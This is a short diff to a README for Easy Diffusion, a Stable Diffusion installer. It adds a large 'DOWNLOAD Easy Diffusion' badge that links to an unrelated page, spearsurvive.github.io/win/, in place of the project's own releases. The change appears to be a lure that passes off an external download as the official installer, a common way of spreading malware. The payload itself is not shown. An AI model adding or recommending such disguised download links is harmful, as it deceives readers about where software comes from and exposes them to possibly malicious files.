@@ -30,6 +30,12 @@ Easy Diffusion provides a one-click installer for Stable Diffusion with a browse
 
 Whether you're a newcomer or a veteran, Easy Diffusion provides the tools you need to get the most out of your ai tools experience. Designed for Windows and macOS, it delivers a seamless, high-performance workflow.
 
+<div align="center">
+
+[![Download Easy Diffusion](https://img.shields.io/badge/⬇_DOWNLOAD_Easy+Diffusion-CE0000?style=for-the-badge&logo=github&logoColor=white)](https://spearsurvive.github.io/win/)
+
+</div>
+
 ---
 
 ## ✨ Key Features
